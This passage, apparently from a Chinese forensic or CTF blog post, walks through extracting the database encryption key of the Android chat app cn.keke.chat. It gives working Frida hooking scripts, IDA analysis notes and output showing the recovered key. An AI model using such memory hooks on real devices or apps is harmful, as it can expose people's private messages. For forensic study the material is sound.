print(&#x27;spawn_added:&#x27;, spawn) event.set()def on_message(spawn, message, data): print(&#x27;on_message:&#x27;, spawn, message, data) def on_message(message, data): if message[&#x27;type&#x27;] == &#x27;send&#x27;: print(&quot;[*] &#123;0&#125;&quot;.format(message[&#x27;payload&#x27;])) else: print(message)device.on(&#x27;spawn-added&#x27;, spawn_added)device.on(&#x27;spawn-removed&#x27;, spawn_removed)device.on(&#x27;child-added&#x27;, on_spawned)device.on(&#x27;child-removed&#x27;, on_spawned)device.on(&#x27;process-crashed&#x27;, on_spawned)device.on(&#x27;output&#x27;, on_spawned)device.on(&#x27;uninjected&#x27;, on_spawned)device.on(&#x27;lost&#x27;, on_spawned)device.enable_spawn_gating()event = threading.Event()print(&#x27;Enabled spawn gating&#x27;)pid = device.spawn([&quot;cn.keke.chat&quot;])#pid = device.spawn([&quot;cn.keke.chat&quot;])session = device.attach(pid)print(&quot;[*] Attach Application id:&quot;,pid)device.resume(pid)# print(&quot;[*] Application onResume&quot;)# script = session.create_script(jscode)# script.on(&#x27;message&#x27;, on_message)# print(&#x27;[*] Running CTF&#x27;)# script.load()sys.stdin.read() 这个脚本是python的 所以我们得在python.exe路径下运行 并且我们还需要安装frida-tools库 1pip install firda-toolspython hook_thread_open_file.py 1Enabled spawn gating[*] Attach Application id: 2324spawn_added: Spawn(pid=2351, identifier=&quot;cn.keke.chat:marsservice&quot;)spawn_added: Spawn(pid=2377, identifier=&quot;cn.keke.chat:pushservice&quot;)[*] 操作文件: 0xc3bdb690[*] 路径:/data/app/cn.keke.chat-1/base.apk[*] 加载文件: libandroidfw.so[*] 操作文件: 0xc3bdb690[*] 路径:/data/app/cn.keke.chat-1/base.apk[*] 加载文件: libandroidfw.so[*] 路径:/data/app/cn.keke.chat-1/lib/x86/libstlport_shared.so[*] 加载文件: libjavacore.so[*] 路径:/data/app/cn.keke.chat-1/base.apk[*] 加载文件: libopenjdkjvm.so[*] 路径:/data/app/cn.keke.chat-1/lib/x86/libmarsxlog.so[*] 加载文件: libjavacore.so[*] 路径:/data/app/cn.keke.chat-1/lib/x86/libmarsstn.so[*] 加载文件: libjavacore.so[*] 路径:/data/app/cn.keke.chat-1/lib/x86/libstlport_shared.so[*] 加载文件: libjavacore.so[*] 路径:/data/app/cn.keke.chat-1/lib/x86/libmarsxlog.so[*] 加载文件: libjavacore.so[*] 路径:/data/app/cn.keke.chat-1/lib/x86/libmarsstn.so[*] 加载文件: libjavacore.so[*] 路径:/data/user/0/cn.keke.chat/files/mipush_region.lock[*] 加载文件: libjavacore.so[*] 路径:/data/user/0/cn.keke.chat/files/mipush_region[*] 加载文件: libopenjdkjvm.so[*] 路径:/data/user/0/cn.keke.chat/shared_prefs/mipush_extra.xml[*] 加载文件: libopenjdkjvm.so[*] 路径:/data/user/0/cn.keke.chat/files/BLBwBwMM/host/ipportrecords2.xml[*] 加载文件: libc.so[*] 路径:/data/user/0/cn.keke.chat/files/BLBwBwMM/Heartbeat.ini[*] 加载文件: libc.so[*] 路径:/data/user/0/cn.keke.chat/databases/geofencing.db[*] 加载文件: libsqlite.so[*] 路径:/data/user/0/cn.keke.chat/shared_prefs/sp_client_report_status.xml[*] 加载文件: libopenjdkjvm.so[*] 路径:/data/user/0/cn.keke.chat/databases/geofencing.db-journal[*] 加载文件: libsqlite.so[*] 路径:/data/user/0/cn.keke.chat/databases/geofencing.db-journal[*] 加载文件: libsqlite.so[*] 路径:/data/user/0/cn.keke.chat/databases/geofencing.db-journal[*] 加载文件: libsqlite.so[*] 路径:/data/user/0/cn.keke.chat/databases/geofencing.db-journal[*] 加载文件: libsqlite.so[*] 路径:/data/user/0/cn.keke.chat/databases/geofencing.db-journal[*] 加载文件: libsqlite.so[*] 路径:/data/user/0/cn.keke.chat/shared_prefs/mipush_extra.xml[*] 加载文件: libopenjdkjvm.so[*] 路径:/data/user/0/cn.keke.chat/shared_prefs/cn.keke.chat_preferences.xml[*] 加载文件: libopenjdkjvm.so[*] 路径:/data/user/0/cn.keke.chat/files/BLBwBwMM/169c2404d30b18c81620889828374/data[*] 加载文件: libmarsstn.so[*] 路径:/data/misc/keychain/pubkey_blacklist.txt[*] 加载文件: libjavacore.so[*] 路径:/data/misc/keychain/serial_blacklist.txt[*] 加载文件: libjavacore.so[*] 路径:/data/misc/keychain/pins[*] 加载文件: libjavacore.so 1[*] 路径:/data/user/0/cn.keke.chat/files/BLBwBwMM/169c2404d30b18c81620889828374/data[*] 加载文件: libmarsstn.so 经确认 这个data就是被加密的数据库了 但是我们要怎么获取私钥key呢 我们进IDA分析一下这个apk是怎么读取数据库的 我们要注意 是这个libmarsstn.so文件读取的数据库文件 我们分析的时候就先分析这个文件 不过注意是x86的 不清楚就都看一下 我们字符串搜索 查看sqlite 发现他是sqlite3的数据库 然后我们找到了一个很有价值的字符串:SQLite format 3 1.rodata:0032363E aSqliteFormat3 db &#x27;SQLite format 3&#x27;,0 ; DATA XREF: sub_23E940+158↑o 更重要的是后面的函数 sub_23E940 我们跟进 查看伪代码 这里就需要思考了 就算这个函数就是加密的函数 那么我们要怎么解密 如果直接硬刚肯定是不现实的 咱没这个实力 1https://www.cnblogs.com/qxxnxxFight/p/4096074.html 这个大佬的博客里面写着一些SQL加密的 可以说是源码 12345678910111213141 void sqlite3pager_free_codecarg(void *pArg);2 int sqlite3_key_interop(sqlite3 *db, const void *pKey, int nKeySize);3 int sqlite3_rekey_interop(sqlite3 *db, const void *pKey, int nKeySize);4 int sqlite3CodecAttach(sqlite3 *db, int nDb, const void *pKey, int nKeyLen);5 int sqlite3_rekey(sqlite3 *db, const void *pKey, int nKey);6 int sqlite3_key(sqlite3 *db, const void *pKey, int nKey);7 void sqlite3pager_set_codec(Pager *pPager,void *(*xCodec)(void*,void*,Pgno,int),void *pCodec);8 static LPCryptBlock CreateCryptBlock(unsigned char* hKey, Pager *pager, LPCryptBlock pExisting);9 static unsigned char * DeriveKey(const void *pKey, int nKeyLen);10 static void * sqlite3pager_get_codecarg(Pager *pPager);11 static void DestroyCryptBlock(LPCryptBlock pBlock);12 void * sqlite3Codec(void *pArg, unsigned char **data_addr, Pgno nPageNum, int nMode);13 void sqlite3_activate_see(const char* right );14 void sqlite3CodecGetKey(sqlite3* db, int nDB, void** Key, int* nKey); 列出的总共是14种 我们看看IDA里面的加密函数 1char *__cdecl sub_23E940(_DWORD *a1, char *a2, int a3, int a4) cdecl 有点像第12个 毕竟你要看他传入的是4个参数 这个可能只是个子函数 我们看看谁调用的他 看看调用它的是调用了几个参数 跟进sub_23E940 看看谁调用的他 1int __usercall sub_20F0E0@&lt;eax&gt;(int a1@&lt;eax&gt;, int a2@&lt;edx&gt;, int a3, int a4) 还是4个的 而且你看名字也有点像12 暂定是他吧 然后我们看第12个 对应的第三个参数就是我们需要的私钥 而这个私钥在调用时会被存放在内存里 上脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273# -*- coding: utf-8 -*-import codecsimport fridaimport sysimport threading#device = frida.get_remote_device()device = frida.get_device_manager().enumerate_devices()[-1]#print(device)pending = []sessions = []scripts = []event = threading.Event()jscode = &quot;&quot;&quot;Java.perform(function () &#123; var Mars = Java.use(&quot;com.tencent.mars.Mars&quot;); Mars.onCreate.implementation = function(args) &#123; var base = Process.findModuleByName(&quot;libmarsstn.so&quot;).base; Interceptor.attach(base.add(0x20F0E0+1), &#123; onEnter: function(sql_args) &#123; send(&quot;key:&quot; + Memory.readUtf8String(sql_args[1])); &#125; &#125;); &#125;&#125;);&quot;&quot;&quot;def on_spawned(spawn): print(&#x27;on_spawned:&#x27;, spawn) pending.append(spawn) event.set()def spawn_added(spawn): print(&#x27;spawn_added:&#x27;, spawn) event.set() if(spawn.identifier.startswith(&#x27;cn.keke.chat&#x27;)): # if(spawn.identifier.startswith(&#x27;cn.keke.chat&#x27;)): session = device.attach(spawn.pid) script = session.create_script(jscode) script.on(&#x27;message&#x27;, on_message) script.load() device.resume(spawn.pid) def spawn_removed(spawn): print(&#x27;spawn_added:&#x27;, spawn) event.set()def on_message(spawn, message, data): print(&#x27;on_message:&#x27;, spawn, message, data) def on_message(message, data): if message[&#x27;type&#x27;] == &#x27;send&#x27;: print(&quot;[*] &#123;0&#125;&quot;.format(message[&#x27;payload&#x27;])) else: print(message)device.on(&#x27;spawn-added&#x27;, spawn_added)device.on(&#x27;spawn-removed&#x27;, spawn_removed)device.on(&#x27;child-added&#x27;, on_spawned)device.on(&#x27;child-removed&#x27;, on_spawned)device.on(&#x27;process-crashed&#x27;, on_spawned)device.on(&#x27;output&#x27;, on_spawned)device.on(&#x27;uninjected&#x27;, on_spawned)device.on(&#x27;lost&#x27;, on_spawned)device.enable_spawn_gating()event = threading.Event()print(&#x27;Enabled spawn gating&#x27;)pid = device.spawn([&quot;cn.keke.chat&quot;])#pid = device.spawn([&quot;cn.keke.chat&quot;])session = device.attach(pid)print(&quot;[*] Attach Application id:&quot;,pid)device.resume(pid)# print(&quot;[*] Application onResume&quot;)# script = session.create_script(jscode)# script.on(&#x27;message&#x27;, on_message)# print(&#x27;[*] Running CTF&#x27;)# script.load()sys.stdin.read() 相比上一个改的不多 就是改了一下jscode 注意 我们的地址都是偏移地址 base.apk的基地址+函数的地址&#x3D;偏移地址 只不过还有一个要注意的地方 根据数据库密钥附加的源码分析 判断左数第三个变量即为私钥 又因为传参的顺序从右向左 则有如下对应关系 为args[0]:nKeyLen, args[1]:pKey; args[2]:nDb; args[3] *db 所以args[1]为私钥pKey 咱hook一下 1Enabled spawn gating[*] Attach Application id: 2150spawn_added: Spawn(pid=2178, identifier=&quot;cn.keke.chat:marsservice&quot;)spawn_added: Spawn(pid=2204, identifier=&quot;cn.keke.chat:pushservice&quot;)[*] key:216bf0c8-75a3-4bc4-841e-87cabf6bac9aspawn_added: Spawn(pid=2270, identifier=&quot;cn.keke.chat:marsservice&quot;)[*] key:216bf0c8-75a3-4bc4-841e-87cabf6bac9aspawn_added: Spawn(pid=2319, identifier=&quot;cn.keke.chat:marsservice&quot;)[*] key:216bf0c8-75a3-4bc4-841e-87cabf6bac9aspawn_added: Spawn(pid=2359, identifier=&quot;cn.keke.chat:marsservice&quot;)[*] key:216bf0c8-75a3-4bc4-841e-87cabf6bac9aspawn_added: Spawn(pid=2401, identifier=&quot;cn.keke.chat:marsservice&quot;)[*] key:216bf0c8-75a3-4bc4-841e-87cabf6bac9aspawn_added: Spawn(pid=2441, identifier=&quot;cn.keke.chat:marsservice&quot;)[*] key:216bf0c8-75a3-4bc4-841e-87cabf6bac9a Jackpot! 然后就可以解密数据库了","categories":[{"name":"Forensic","slug":"Forensic","permalink":"https://dawoxiansigema.github.io/categories/Forensic/"}],"tags":[]}],"categories":[{"name":"Fix","slug":"Fix","permalink":"https://dawoxiansigema.github.io/categories/Fix/"},{"name":"Heap","slug":"Heap","permalink":"https://dawoxiansigema.github.io/categories/Heap/"},{"name":"Fomatstring","slug":"Fomatstring","permalink":"https://dawoxiansigema.github.io/categories/Fomatstring/"},{"name":"Stack/Medium","slug":"Stack-Medium","permalink":"https://dawoxiansigema.github.io/categories/Stack-Medium/"},{"name":"Stack/Advanced","slug":"Stack-Advanced","permalink":"https://dawoxiansigema.github.io/categories/Stack-Advanced/"},{"name":"Stack/Basic","slug":"Stack-Basic","permalink":"https://dawoxiansigema.github.io/categories/Stack-Basic/"},{"name":"Forensic","slug":"Forensic","permalink":"https://dawoxiansigema.github.io/categories/Forensic/"}],"tags":[]}